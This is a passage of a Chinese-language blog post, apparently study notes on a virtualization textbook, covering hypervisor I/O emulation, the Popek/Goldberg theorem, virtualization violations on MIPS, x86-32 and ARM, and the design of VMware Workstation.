总是以减少的权限执行，例如，这样它就不能执行有特权的结构体。因此，每当来宾操作系统试图执行一条特权指令时，虚拟机的直接执行就会导致频繁的陷阱，系统管理程序必须模拟这条特权指令。因此，围绕直接执行而设计的 hypervisor 遵循陷阱-模拟编程范型，其中大部分执行开销是由虚拟机的 hypervisor 模拟陷阱引起的。物理内存在虚拟机之间也是多路复用的，因此每个虚拟机都有一个连续的、固定大小的物理内存量的错觉。类似于操作系统在进程之间的分配。构建虚拟机监控程序的独特挑战在于 MMU 的虚拟化，以及向虚拟机公开用户级和内核级执行环境的能力。复用和仿真的结合也是足够的，因为当今计算机系统的 I/O 操作是通过合理的高级操作来实现的，例如，设备驱动程序可以发出简单的命令来发送描述符环中指定的网络数据包列表，或者发出32KB 的磁盘请求。虚拟机监控程序模拟每个类别至少一个代表性设备的硬件/软件接口，即一个磁盘设备、一个网络设备、一个屏幕设备等。作为此仿真的一部分，系统管理程序使用可用的物理设备来发出实际的 I/O。</p><p>长期以来，I/O 仿真一直是 I/O 设备虚拟化的首选方法，因为它具有可移植性优势: 即使在具有不同硬件设备的平台上运行时，虚拟机也能“看到”相同的虚拟硬件。今天，现代硬件包括对 I/O 虚拟化的高级架构支持，它能够实现某些类别的 I/O 设备的多路复用，在吞吐量和延迟方面具有显著的性能优势，但仍然以降低虚拟机的移动性和可移植性为代价。</p><p>表1.1提供了一个在2000年发布的早期面向桌面的 hypervisor VMware Workstation 2.0中多路复用和仿真结合使用的具体例子。显然，硬件已经过时了: USB 显然不见了，而且大多数读者从未见过真正的软盘。然而，这些概念仍然是相同的。对于每个组件，表1.1描述了前端设备抽象(可视为虚拟机的硬件)以及用于实现它的后端仿真机制。当资源是多路复用的，如 x86 CPU 或内存时，前端和后端是相同的，并由硬件定义。系统管理程序仅用于建立虚拟资源和物理资源之间的映射，然后硬件可以直接使用这些资源，而不需要进一步拦截</p><p><img src="https://img.gls.show/img/20230903165003.png">然而，当资源被模拟时，前端设备对应于该设备的一个经典选择的代表，独立于后端。系统管理程序同时实现前端和后端，通常在没有任何特定硬件支持的软件中实现。前端实际上是所选择的、有代表性的设备的软件模型。后端仿真在底层资源中选择实现功能。这些底层资源可能是物理设备或主机操作系统的某些更高级别的抽象。例如，VMware Workstation 中的磁盘前端要么是 IDE，要么是 Buslogic SCSI 设备，这是当时流行的选择，其设备驱动程序无处不在。后端资源可以是物理设备，即实际的原始磁盘，也可以是存储为现有文件系统中的大文件的虚拟磁盘。尽管不再是底层硬件的精确副本，虚拟机仍然是兼容的。假设可以在客户操作系统中加载一组不同的设备驱动程序，那么虚拟机将具有相同的功能。到目前为止，这个系统管理程序示意图假定处理元素的各个组件可以虚拟化。然而，我们还提到了一些硬件架构未能为虚拟化提供硬件支持的历史事实。是讨论将是第二章和第三章的核心。</p><h2 id="1-6-NAMES-FOR-MEMORY"><a href="#1-6-NAMES-FOR-MEMORY" class="headerlink" title="1.6 NAMES FOR MEMORY"></a>1.6 NAMES FOR MEMORY</h2><blockquote><p>在早期的虚拟化论文中，有些文献使用了不同的术语，特别是”物理内存”和”机器内存”，来分别指代客户-物理内存和主机-物理内存，以区分虚拟机内存和实际物理内存。这种术语的使用可能会导致混淆，因此为了明确起见，通常使用”客户物理内存”和”主机物理内存”这样的术语。</p></blockquote><ol><li><strong>管理程序</strong>：在虚拟化计算机系统中，管理程序是指虚拟机监视器（VMM）或超级管理程序，它负责管理虚拟机的资源，包括内存、处理器、存储等。</li><li><strong>虚拟物理内存</strong>：这个术语指的是虚拟机可见的抽象内存，即虚拟机认为自己可以使用的内存量。然而，为了避免与虚拟内存（虚拟内存是一种操作系统技术，允许将物理内存扩展到磁盘上）混淆，通常将虚拟机可见的抽象内存称为”客户物理内存”。</li><li><strong>客户物理内存</strong>：这个术语用来表示虚拟机可见的抽象内存。虚拟机认为它可以自由使用客户物理内存，而不需要考虑底层的物理硬件细节。</li><li><strong>主机物理内存</strong>：这个术语用来表示底层实际的物理内存资源，也就是虚拟机实际运行在的物理硬件上的内存。主机物理内存是管理程序（VMM）负责管理的资源。</li></ol><h2 id="1-7-虚拟化和半虚拟化-PARAVIRTUALIZATION-的方法"><a href="#1-7-虚拟化和半虚拟化-PARAVIRTUALIZATION-的方法" class="headerlink" title="1.7 虚拟化和半虚拟化(PARAVIRTUALIZATION)的方法"></a>1.7 虚拟化和半虚拟化(PARAVIRTUALIZATION)的方法</h2><ol><li><strong>全（软件）虚拟化（Full Software Virtualization）</strong>：<ul><li>这种方法指的是针对不具备完全虚拟化支持的体系结构，旨在最大程度地提高硬件兼容性的虚拟化监视器（hypervisors）。它特别支持在未经修改的操作系统上运行，包括VMware早期版本的虚拟化监视器。</li><li>有时在文献中也称为”软件虚拟化”。这种方法需要在执行前（至少有时）将虚拟机指令序列进行翻译。详细描述在§3.2中。</li></ul></li><li><strong>硬件虚拟化（Hardware Virtualization，HVM）</strong>：<ul><li>这种方法是为具有对虚拟化提供体系结构支持的体系结构构建的虚拟化监视器，包括所有最近的处理器。这样的虚拟化监视器还支持未经修改的客户操作系统。</li><li>与软件虚拟化方法不同，HVM虚拟化监视器完全依赖于直接执行虚拟机指令，而不需要翻译。在文献中，HVM有时被称为HV。详细的要求在第2章中得到正式定义。</li><li>架构和虚拟化监视器的示例在第4章中讨论x86体系结构的VT-x和第7章中讨论ARM体系结构的虚拟化扩展。</li></ul></li><li><strong>半虚拟化（Paravirtualization）</strong>：<ul><li>这种方法进行了不同的权衡，更注重简单性和整体效率，而不是与底层硬件的完全兼容性。这个术语最早由Denali引入，后来由早期的Xen虚拟化监视器广泛使用。</li><li>在没有虚拟化支持的平台上使用时，半虚拟化要求更改客户操作系统的二进制代码，以与底层硬件兼容。而在具备完全虚拟化支持的体系结构上，半虚拟化仍然用于通过平台特定的扩展来增强HVM，通常在设备驱动程序中实现，例如协同管理内存或实现高性能的前端设备。</li><li>这将在§3.3中详细描述。</li></ul></li></ol><h2 id="1-8-使用虚拟机的好处"><a href="#1-8-使用虚拟机的好处" class="headerlink" title="1.8 使用虚拟机的好处"></a>1.8 使用虚拟机的好处</h2><p>虚拟机最初是在大型机上发明的，当时硬件稀缺而且非常昂贵，操作系统还很原始</p><p>好处：</p><ol><li><strong>操作系统多样性</strong>：虚拟化允许不同的操作系统同时运行在一台计算机上。这是许多桌面导向的Type-2虚拟化监视器的主要原因之一。例如，它使得在Mac OS 上使用虚拟机（如Fusion和Parallels）运行Windows（有时还包括Linux）成为可能。</li><li><strong>服务器整合</strong>：今天，企业IT最佳实践仍然要求每台服务器每次运行一个应用程序。随着硬件性能和效率的提高，一台物理机通常更多地成为一个虚拟机。这种服务器整合可以节省硬件成本和数据中心资源。</li><li><strong>快速部署</strong>：部署物理服务器是一个复杂而耗时的任务。相比之下，可以通过门户或API完全在软件中创建虚拟机，并部署软件堆栈作为虚拟设备。这种快速部署有助于提高效率和灵活性。</li><li><strong>安全性</strong>：虚拟化引入了数据中心堆栈中的新管理层，与客户操作系统不同且不可见，但能够审查操作系统的行为、执行入侵分析、或验证其来源。虚拟化监视器还可以控制虚拟机的所有I/O操作，从而轻松插入虚拟机特定的防火墙或连接到虚拟网络，增强安全性。</li><li><strong>高可用性</strong>：虚拟机是一个封装的抽象，可以在任何运行兼容虚拟化监视器的服务器上运行。因此，虚拟机可以在硬件崩溃后在新服务器上重新启动，无需进行操作系统级的配置或感知，从而提供了高可用性解决方案。</li><li><strong>分布式资源调度</strong>：使用实时迁移技术，一组虚拟化监视器可以变成一个单一的资源池，允许在集群中自动和透明地重新平衡虚拟机。这提高了资源的利用效率。</li><li><strong>云计算</strong>：在虚拟化环境中，不同的客户（租户）可以在彼此隔离的环境中运行自己的虚拟机。当与网络虚拟化等技术结合使用时，这为云计算提供了基础，包括Amazon Web Services、Google Compute Engine和Microsoft Azure等云计算技术。</li></ol><h1 id="2-The-Popek-Goldberg-theorem"><a href="#2-The-Popek-Goldberg-theorem" class="headerlink" title="2 The Popek/Goldberg theorem"></a>2 The Popek/Goldberg theorem</h1><p>在1974年，Gerald Popek 和 Robert Goldberg 在ACM通信杂志上发表了一篇重要的论文，名为《第三代体系结构的虚拟化的形式要求》，该论文定义了确保虚拟机管理器（VMM）可以构建的必要和充分的形式要求 [143]。准确地说，他们的定理<strong>确定了一个给定的指令集架构（ISA）是否可以通过使用多路复用来虚拟化，使其可以在虚拟机内运行</strong>。对于满足定理假设的任何体系结构，任何直接运行在硬件上的操作系统也可以在虚拟机内运行，无需进行修改。当时，这项工作的动机是要解决新体系结构意外地阻止了VMM构建的证据。作者在文章中引用了DEC PDP-10，其中看似随机的架构决策“破坏”了虚拟化。尽管结果很简单，但这个定理的相关性在几十年内都被计算机架构师忽视了，一代又一代的新处理器架构都没有考虑这个定理的技术要求。直到后来，随着虚拟机再次变得重要，英特尔和AMD明确确保他们的虚拟化扩展满足Popek和Goldberg的标准，以便未经修改的客户操作系统可以直接在虚拟机中运行，而无需使用软件翻译或半虚拟化 [171]。今天，这个定理仍然是理解计算机体系结构与其支持虚拟机的能力之间的基本关系的明显起点。具体来说，这个定理确定了一个仅依赖于直接执行的VMM是否能够支持客户任意操作系统。</p><h2 id="1-1-模型"><a href="#1-1-模型" class="headerlink" title="1.1 模型"></a>1.1 模型</h2><blockquote><p>略去数学证明</p></blockquote><p>尽管存在理想化，特别是由于缺乏寄存器，但这种体系结构模型与我们今天都熟悉的模型基本没有根本区别。对于这种体系结构，Popek和Goldberg提出了以下形式化研究问题。…假设存在一个符合这一基本体系结构模型的计算机，在哪些明确条件下可以构建一个VMM，以便VMM：</p><ul><li>能够执行一个或多个虚拟机；</li><li>在任何时候都完全控制计算机；</li><li>支持针对相同体系结构设计的任意、未经修改的、潜在恶意的操作系统；以及</li><li>具备高效性，最坏情况下只会导致速度略微下降？</li></ul><p>这个问题的答案决定了是否可以为特定的体系结构构建VMM，以便生成的“虚拟机可以是实际机器的高效、隔离的副本”。当满足条件时，定理必须确保符合以下三个标准：</p><ol><li>等效性：虚拟机与底层处理器基本相同，即计算机体系结构的副本。在虚拟机内运行的任何程序，即任何客户操作系统和应用程序组合，应该表现出与该程序直接在底层硬件上运行时相同的行为，除了可能由于时间依赖性或资源可用性（例如物理内存量）等差异。</li><li>安全性：VMM必须始终完全控制硬件，而不做任何关于虚拟机内运行的软件的假设。虚拟机与底层硬件隔离，运行方式就好像它在一个独立的计算机上运行一样。此外，不同的虚拟机必须相互隔离。该定理及其证明关注第一个安全性属性。第二个属性可以通过确保在两个虚拟机之间没有共享状态来实现。</li><li>性能：效率要求意味着在虚拟化环境中运行的程序的执行速度最多只会比直接在底层硬件上运行时的执行时间略微下降。</li></ol><h2 id="2-2-定理"><a href="#2-2-定理" class="headerlink" title="2.2 定理"></a>2.2 定理</h2><blockquote><p>定理1 [143]：对于任何传统的第三代计算机，如果该计算机的敏感指令集是特权指令集的子集，那么可以构建一个虚拟机监视器</p></blockquote><h2 id="2-3-递归虚拟化和混合虚拟机"><a href="#2-3-递归虚拟化和混合虚拟机" class="headerlink" title="2.3 递归虚拟化和混合虚拟机"></a>2.3 递归虚拟化和混合虚拟机</h2><p>该论文包括另外两个定理，分别涵盖递归虚拟化和混合虚拟机的要求。这个形式主义也适用于递归虚拟化的推理。事实上，满足定理条件的理想化体系结构也可以支持递归虚拟机。在这种情况下，虚拟机可以在客户-监管模式下运行一个VMM，而不是一个操作系统。这个VMM当然可以运行多个虚拟机，它们的客户操作系统以及它们各自的应用程序。该论文的第二个定理规范化了对VMM（而不是体系结构）提出的最少的附加假设集，以支持递归虚拟机。在递归虚拟化中，VMM本身必须在虚拟机内（未修改地）运行。近年来，递归虚拟化的研究兴趣有所增加 [33, 191]。</p><p>该论文还引入了混合虚拟机的概念，讨论了在特定情况下不满足标准的情况。再次考虑PDP-10的JRST 1指令，该指令可用于从监管模式返回到用户模式，同样也可用于在已经处于用户模式时返回子程序。显然，这是灾难性的，因为虚拟机将在没有必要进入VMM的情况下在客户操作系统和应用程序之间切换。如果发生这种情况，虚拟机将在VMM认为它仍然处于客户-监管模式时执行应用程序代码，尽管这显然是不可接受的。但对于这个特定指令来说，关键观察是，只有当虚拟机处于监管模式时，它才是控制敏感的。当虚拟机处于用户模式时，该特定指令对虚拟化不敏感。形式上来说，让我们定义一个指令在用户模式下是用户敏感的，如果它在监管模式下是行为敏感的或者控制敏感的，但在用户模式下不敏感。该定理陈述如下。</p><blockquote><p>定理3[143] : 可以为任何传统的第三代机器构造混合虚拟机监视器，其中用户敏感指令集是特权指令集的子集。</p></blockquote><p>定理3要比定理1弱得多，由此产生的混合虚拟机监视器与传统的VMM相当不同。具体来说，混合虚拟机监视器可以绕过这些限制：</p><ul><li>当虚拟机运行应用程序时，即处于客户-用户模式时，混合VMM的行为类似于普通的VMM。</li><li>在虚拟机-监管模式下，混合VMM不使用直接执行，而是以100%的软件方式解释所有指令。换句话说，它解释了通过客户操作系统的所有路径的执行。尽管解释会产生很高的开销，但只要在相关工作负载中在操作系统中花费的时间部分较小，这种方法可能是可行的。第三个定理在早期识别了一个关键的细微差别，在后来半虚拟化和混合解决方案出现时，这个差别将发挥至关重要的作用，这些解决方案将直接执行与二进制翻译相结合。这些将在后面的章节中讨论。</li></ul><h2 id="2-4-讨论-用分页代替分段"><a href="#2-4-讨论-用分页代替分段" class="headerlink" title="2.4 讨论: 用分页代替分段"></a>2.4 讨论: 用分页代替分段</h2><p>1974年的原始论文认识到虚拟内存是任何类型的虚拟化支持的基本前提。</p><p>为了简化起见，作者假设虚拟内存是通过单个重定位绑定的寄存器对来实现的。现在，考虑一个更现实的模型，其中虚拟内存是通过分页而不是分段来实现的。如果使用分页来实现虚拟内存，定理是否仍然适用？简短的答案是是，但深入分析会发现在第三代模型中不存在的细微差别，这些差别在构建实际系统时将发挥实际作用。特别是，访问内存的指令可能是位置敏感的，因为VMM也必须存在于内存的某个位置。此外，尽管客户操作系统以非特权方式运行，但必须确保它不受应用程序的影响。在x86体系结构中，这两个问题将在§4.1中重新讨论，分别作为地址空间压缩和特权级别压缩的挑战。</p><p>最后，VMM必须通过将客户操作系统指定的页表映射与客户物理内存和主机物理内存之间的映射组合来构建虚拟地址空间。在理想化的分段体系结构中，这只是一个简单的组合问题，但在基于页面的系统中要复杂得多。实际上，解决这个问题有两种常用的方法，分别称为影子页表（见§3.2.5）和扩展页表（见§5.1）。</p><h2 id="2-5-WELL-KNOWN-VIOLATIONS"><a href="#2-5-WELL-KNOWN-VIOLATIONS" class="headerlink" title="2.5 WELL-KNOWN VIOLATIONS"></a>2.5 WELL-KNOWN VIOLATIONS</h2><p>在他们的文章中，Popek和Goldberg以DEC PDP-10为例，说明了一种未能满足虚拟化要求的架构。现在让我们列举一些现代时代已知的违规行为。这个违规行为的列表不是详尽无遗的。对于讨论的体系结构，我们侧重于那些在限制不具备完整性声称的处理器架构的部署方面产生实际影响的违规行为。我们确实识别了一些违规行为的模式：</p><ul><li>直接访问物理内存：某些体系结构决策直接将物理内存暴露到虚拟内存的硬编码部分。这在MIPS体系结构中特别明显（见§2.5.1）。</li><li>位置敏感指令：其他决策通过非特权指令公开了某些敏感数据结构在内存中的位置（例如，x86中的全局描述符表，见§2.5.2）。</li><li>控制敏感违规行为：当ISA明确为相同指令定义了不同的语义，取决于特权级别时，就会发生这种情况（例如，x86上的iret、popf，见§2.5.2）。</li></ul><h3 id="2-5-1-MIPS"><a href="#2-5-1-MIPS" class="headerlink" title="2.5.1 MIPS"></a>2.5.1 MIPS</h3><p>MIPS体系结构是一种经典的RISC（精简指令集计算机）ISA。它有三种执行模式：内核模式（最高特权级别）、监管模式和用户模式（最低特权级别）。只有内核模式可以执行特权指令。监管模式实际上是用户模式的一种备用形式，其明显好处在于它可以访问对常规用户模式不可用的虚拟内存部分。</p><p>首先，好消息是：这是一个非常有前途的高效虚拟机监视器设计的起点。事实上，虚拟机监视器将在内核模式下运行，并且可以简单地在监管模式下运行客户操作系统，根据其原始语义模拟所有特权指令。监管模式的可用性导致了一个重要的优化：由于监管虚拟内存受到应用程序的保护，虚拟机监视器可以简单地将客户操作系统和应用程序之间的转换视为监管模式和用户模式之间的转换。这种转换不需要更改虚拟内存的配置，也不需要刷新TLB（转译后备缓存）。</p><p>在MIPS体系结构中，虚拟内存被划分为多个固定大小的区域，每个区域都具有硬编码的属性，确定了需要访问该区域的执行模式，如何通过TLB（映射）或通过硬编码的掩码（未映射）来重新定位地址，以及是否应该通过高速缓存层次结构进行访问。表2.1显示了32位体系结构的这些区域。64位扩展创建了具有相同一般原理的额外的固定大小区域。</p><p>现在是坏消息：MIPS体系结构不具备虚拟化能力，首要原因是它使用了区域。事实上，区域的使用是位置敏感的（一种行为敏感），因为它是处理器特权级别的函数。这具有严重的后果，因为任何期望在内核模式下运行的操作系统都将被编译以使用KSEG0和KSEG1段。如果虚拟机监视器尝试在监管模式或用户模式下运行该操作系统，每个内存加载/存储指令都会导致陷阱，从而违反了虚拟化的效率标准。由于操作系统通常不会编译或链接为可执行位置无关的代码，因此虚拟化MIPS体系结构至少需要重新编译完整的客户操作系统内核。我们在§3.1中讨论了Disco，一款基于MIPS的虚拟机监视器的实现所需的体系结构和妥协。</p><h3 id="2-5-2-X86-32"><a href="#2-5-2-X86-32" class="headerlink" title="2.5.2 X86-32"></a>2.5.2 X86-32</h3><p>Intel x86-32体系结构是一个以复杂著称的CISC体系结构，部分原因是它包括对多十年的向后兼容性的传统支持。多年来，该体系结构引入了四种主要操作模式（实模式、保护模式、v8086模式和系统管理模式），每种模式以不同的方式启用了硬件的分段模型、分页机制、四个保护环以及安全功能（如调用门）。</p><p>x86-32体系结构不具备虚拟化能力。它包含了虚拟化敏感但非特权的指令，这违反了Popek和Goldberg对严格虚拟化的标准 [143]。这排除了传统的陷阱和模拟方法来进行虚拟化。</p><p>具体来说，Robin和Irvine识别出了17个敏感但非特权的问题指令 [151]。表2.2将这些指令分成了5类：操作中断标志的指令、操作段寄存器和段描述符的指令、可以查看系统数据结构位置的指令，以及与调用门相关的指令。其影响非常严重，而且广泛知晓。实际上，在引入VMware之前，Intel Corporation的工程师们确信他们的处理器在任何实际意义上都无法虚拟化 [74]。</p><p><img src="https://img.gls.show/img/20230904114544.png"></p><p>x86-32体系结构确实提供了一个符合Popek/Goldberg定理的严格可虚拟化的执行模式：v8086模式专门设计用于运行16位虚拟机，运行16位的Intel 8086 ISA。这个模式对于Windows 95/98至关重要，因为它允许这些32位操作系统运行传统的MS-DOS程序。不幸的是，该模式只能执行16位的虚拟机。</p><h3 id="2-5-3-ARM"><a href="#2-5-3-ARM" class="headerlink" title="2.5.3 ARM"></a>2.5.3 ARM</h3><p>ARM架构是一种RISC ISA。从虚拟化的角度来看，ARM可以看作具有两种主要的执行模式，一种或多种特权模式和用户模式。只有特权模式才能执行特权指令。例如，ARMv6具有7种处理器模式，用户模式和6种特权模式，而ARMv8实际上只有用户模式和单一特权模式，尽管ARMv8的术语将它们称为异常级别。每种模式都有一些分组寄存器，这意味着，例如，寄存器13在每种模式下指向不同的物理寄存器。特权模式之间的区别仅涉及分组寄存器，对于本讨论的目的可以忽略不计。</p><p>ARM架构不具备虚拟化能力。它包含了虚拟化敏感但非特权的指令，违反了Popek和Goldberg对严格虚拟化的标准。Dall和Nieh识别出了24个敏感但非特权的问题指令。这些特定指令是针对ARMv6识别的，但也存在于架构的其他版本中。例如，ARMv7在这方面与ARMv6非常相似。甚至在最新版本的ARM架构ARMv8中，也存在类似的问题指令。这些指令涉及用户模式寄存器、状态寄存器以及依赖于CPU模式的内存访问，如表中所列。</p><p><img src="https://img.gls.show/img/20230904114819.png"></p><p>有各种加载/存储多个指令，当处于特权模式时访问用户模式寄存器。然而，这些指令在ARM架构中被定义为在用户模式下执行时是不可预测的，这意味着不能依赖指令的结果。例如，一个常见的不可预测指令的实现是，处理器会忽略它而不会引发陷阱。</p><p>状态寄存器指令涉及到特殊的ARM状态寄存器，即当前程序状态寄存器（CPSR）和保存程序状态寄存器（SPSR）。CPSR指定了CPU的当前模式和其他状态信息，其中一些是特权的。SPSR是在多种特权模式下可用的分组寄存器。基本的ARM保护机制通过在处理器通过异常进入相应特权模式时将CPSR复制到SPSR来工作，以便可以确定异常发生时的CPU状态信息。类似地，SPSR在各种时候复制到CPSR，以更新CPU的模式作为首选的异常返回机制。这些指令存在三种问题。首先，MRS可以在任何模式下用于读取CPSR并确定CPU模式，尽管在ARMv8中不再如此。其次，CPS用于写入CPSR并更改CPU模式，但在用户模式下执行时会被忽略。第三，当在用户模式下执行时，其他状态寄存器指令是不可预测的。例如，LDM（3）在特权模式下执行时将SPSR复制到CPSR作为指令的一部分，但在用户模式下执行时是不可预测的。</p><p>几乎所有的数据处理指令都有一个特殊版本，除了其ALU操作外，还将CPSR替换为SPSR。这些指令以在异常返回时更改CPU模式的方式设计，例如，可以从内核跳转到用户空间并同时更改模式。这些指令在用户模式下执行时是不可预测的。</p><p>内存访问指令使用不同于执行模式的CPU模式来访问内存。ARM处理器上的虚拟内存系统使用访问权限来限制根据CPU模式对内存的访问。尽管CPU处于特权模式，架构定义了四个名为”带翻译的加载/存储”的指令，这些指令使用用户模式的访问权限来访问内存，因此会由于内存访问违规而触发陷阱。然而，当在用户模式下执行时，这些指令的行为就像常规的内存访问指令一样。例如，当作为虚拟机的一部分以用户模式运行操作系统内核时，这些指令的语义与在内核模式下运行操作系统时不同，因此操作系统可能看不到它所期望的内存访问故障。</p><h2 id="2-6-FURTHER-READING"><a href="#2-6-FURTHER-READING" class="headerlink" title="2.6 FURTHER READING"></a>2.6 FURTHER READING</h2><p>Popek和Goldberg的论文中的证明是针对一个理想化的单处理器、第三代架构以及单一虚拟内存段的。当然，当前的架构要复杂得多：它们支持具有缓存一致性和明确定义的细微内存一致性模型的多处理器架构。它们支持通过分页的虚拟内存，可以作为分段的替代或补充。更糟糕的是，细节中包含问题，特别是在具有众多传统执行模式和指令的CISC架构上。</p><p>尽管存在这些注意事项，但构建性的证明提供了一种推理虚拟化的框架。控制敏感和行为敏感指令的分类对评估任何现代计算机架构都是有用的指南。鼓励有兴趣的读者详细阅读Popek和Goldberg的经典论文，以便他们可以推理已知的架构[143]。</p><p>x86-32的限制已经被Robin和Irvine记录下来[151]，然而，该论文错误地得出结论，因此无法构建实际且安全的虚拟化解决方案。第4章描述了Intel后来如何依赖Popek和Goldberg的定理作为框架，在x86-64处理器中添加了虚拟化支持[171]。</p><p>ARMv6和早期的ARM架构的限制已经被Dall和Nieh记录下来[59]。第7章描述了ARM后来如何在ARMv7处理器中添加了虚拟化支持[39]，以及该架构如何与Popek和Goldberg的定理相关。</p><h1 id="3-Virtualization-without-Architectural-Support"><a href="#3-Virtualization-without-Architectural-Support" class="headerlink" title="3 Virtualization without  Architectural Support"></a>3 Virtualization without  Architectural Support</h1><p>这一章主要是关于过去的内容。那些只关心了解虚拟化在当代硬件和虚拟机监视器上运行方式的从业者可能会倾向于跳转到第四章。然而，过去对于任何需要了解我们是如何走到今天的情况的计算机科学家以及对早期开发的具体技术感兴趣的人仍然具有重要意义。</p><p>实际上，先前开发的许多软件技术在虚拟化之外也有应用。此外，阅读本章的计算机架构师将对在引入虚拟化硬件支持之前和之后所做的架构决策的意外后果有所了解。例如，VMware和Xen都依赖于32位架构上的分段来进行保护，正如本章所述。随着在x86-64上引入VT-x，分段不再需要构建虚拟机监视器，因此分段被移除。然而，分段还有其他应用，例如为轻量级虚拟机提供保护，如VX32 [71]和最初的Google原生客户端[190]。</p><p>MIPS、x86-32和ARM的Popek和Goldberg定理的违规行为在§2.5中已经描述过。由于这些违规行为的直接后果，没有任何虚拟机监视器——至少没有使用Popek和Goldberg所预期的陷阱和模拟与直接执行相结合的技术构建的虚拟机监视器——能够同时满足等效性、安全性和性能要求。</p><p>本章描述了三个系统——Disco、VMware Workstation和Xen——它们分别使用不同的技术或做出不同的权衡来解决定理的限制。表3.1提供了本章其余部分的导航。每个部分都作为一个案例研究，介绍了特定虚拟机监视器的显著特点，这些部分按照引入每个系统的时间顺序排序。</p><h2 id="VMWARE-WORKSTATION—FULL-VIRTUALIZATION-ON-X86-32"><a href="#VMWARE-WORKSTATION—FULL-VIRTUALIZATION-ON-X86-32" class="headerlink" title="VMWARE WORKSTATION—FULL VIRTUALIZATION   ON X86-32"></a>VMWARE WORKSTATION—FULL VIRTUALIZATION   ON X86-32</h2><p>VMware Workstation 1.0于1999年发布，是32位x86架构的第一个虚拟机监视器（VMM）[45, 46, 65, 162]。作为一款商业产品，VMware的愿景是创建一个在由x86-32 CPU构建的通用平台上有用的虚拟化层，并主要运行Microsoft Windows操作系统（即WinTel平台）。虚拟化的好处可以帮助解决WinTel平台已知的一些限制，如应用程序互操作性、操作系统迁移、可靠性和安全性。此外，虚拟化还可以轻松实现操作系统替代方案的共存，特别是Linux。</p><p>由于其专注于商业封闭源操作系统，x86计算环境与虚拟化需要采用新的方法，因为不像以前的Disco或稍后的Xen那样重新编译内核是一个选项。此外，x86行业具有分散的结构。不同的公司独立开发x86处理器、计算机、操作系统和应用程序。然后，系统集成商将这些组件组合成一个支持的“开箱即用”解决方案。对于x86平台，虚拟化需要在不改变平台的现有硬件或现有软件的情况下插入。因此，VMware Workstation的架构如下：</p><ul><li>作为纯虚拟化解决方案，与现有未修改的客户操作系统兼容；</li><li>作为现有Linux和Windows主机操作系统的Type-2虚拟机监视器。</li></ul><p>VMware Workstation将Popek和Goldberg的虚拟机的三个核心属性适应到基于x86的目标平台，具体如下：</p><ol><li><strong>等价性（Equivalence）：</strong>正如在§2.5.2中讨论的，x86-32架构具有17个虚拟化敏感的非特权指令，这违反了Popek和Golberg关于严格虚拟化的标准[151]。这排除了传统的陷阱和模拟虚拟化方法。事实上，英特尔公司的工程师曾坚信他们的处理器无法以任何实际意义的方式进行虚拟化[74]。VMware的解决方案结合了直接执行（在可能的情况下，特别是用于运行应用程序）和动态二进制翻译（在需要时，特别是在运行客户操作系统时）。动态二进制翻译是一种高效的仿真形式；参见§3.2.2。</li><li><strong>安全性（Safety）：</strong>虚拟机监视器必须保证虚拟机的隔离，而不会对内部运行的软件做任何假设。VMware Workstation配置了硬件，特别是广泛使用分段截断来隔离虚拟机（参见§3.2.3）。为了简化测试并减少在未经测试的代码路径中引入安全漏洞的可能性，VMware Workstation仅支持x86-32架构的子集，以运行某些指定的支持客户操作系统。任何不受支持的请求，例如尝试在%cpl¹=1或%cpl=2处执行代码，这在任何支持的客户操作系统中都不会发生，将简单地中止执行。</li><li><strong>性能（Performance）：</strong>作为设计目标，VMware的目标是以接近本机速度运行相关工作负载，而在最坏的情况下，将它们运行在当时的处理器上，性能与在不具备虚拟化功能的前一代处理器上运行时相同。这样的性能水平将允许用户有效地使用虚拟机，就像使用真实机器一样。这基于这样一个观察，即大多数x86软件并不是设计仅在最新一代CPU上运行的。</li></ol><p>为了实现这样的性能目标，尽管其为Type-2架构且存在主机操作系统，VMware Workstation在执行期间需要对硬件进行完全控制。§3.2.3描述了如何配置段表和CPU以减少动态二进制翻译的开销。§3.2.4描述了Type-2虚拟机监视器的模块化设计，分为三个不同的组件：主机操作系统的用户级进程、主机操作系统内的内核模块以及在硬件的完全控制下运行的VMware VMM。这是通过world switch实现的，它在与主机操作系统的共位情况下赋予了VMware VMM对硬件的完全控制权。最后，§3.2.5描述了影子分页，允许虚拟机（包括客户操作系统）直接使用底层硬件的内存管理单元（MMU）。</p><h3 id="3-2-1-X86-32-FUNDAMENTALS"><a href="#3-2-1-X86-32-FUNDAMENTALS" class="headerlink" title="3.2.1 X86-32 FUNDAMENTALS"></a>3.2.1 X86-32 FUNDAMENTALS</h3><p>在深入讨论VMware如何虚拟化x86-32架构之前，让我们简要介绍该架构的关键方面：</p><ol><li><strong>执行模式：</strong><ul><li>x86-32架构具有一种本机执行模式，称为“保护模式”，是现代操作系统和应用程序的主要运行模式。</li><li>此外，它包括三种非本机模式：实模式、系统管理模式和v8086模式，每种模式具有特定的用途。</li><li>在保护模式下，当前特权级别（cpl）用于区分内核执行（%cpl=0）和用户级执行（%cpl&gt;0）。理论上有四个特权级别，但在实际中，用户级代码通常在%cpl=3下运行，中间特权级别不被使用。</li></ul></li><li><strong>I/O特权级别（IOPL）：</strong><ul><li>该架构引入了I/O特权级别（iopl），允许用户级代码启用或禁用中断，提供了控制不同特权级别中断处理的机制。</li></ul></li><li><strong>内存管理：</strong><ul><li>x86-32架构采用分段和分页两种内存管理机制。</li><li>分段由六个段寄存器管理，如代码段（%cs）、堆栈段（%ss）、数据段（%ds）以及额外的段寄存器（%es、%fs、%gs）。每个段通过基地址和限制定义了32位线性地址的一部分。</li><li>分页用于将线性地址转换为物理地址。该架构规定了一个以特权级寄存器%cr3为根的三级页表结构。</li><li>当发生TLB（翻译高速缓冲）未命中时，处理器直接遍历页表结构并将映射插入TLB，无需软件干预。</li></ul></li></ol><p>了解x86-32架构的这些基本方面对于理解VMware如何针对该平台进行虚拟化至关重要。</p><h3 id="3-2-2虚拟化-X86-32-CPU"><a href="#3-2-2虚拟化-X86-32-CPU" class="headerlink" title="3.2.2虚拟化 X86-32 CPU"></a>3.2.2虚拟化 X86-32 CPU</h3><p>为了虚拟可虚拟化的体系结构而构建的虚拟机监控程序（VMM）采用了由Popek和Goldberg描述的陷阱和仿真方法。这种技术也被称为直接执行（DE），因为虚拟机指令直接在处理器上执行。然而，由于其设计目标是在不可虚拟化的体系结构上运行未经修改的客户操作系统，单独的直接执行并不是一种策略。</p><p>另一种选择是采用全仿真方法。通过SimOS 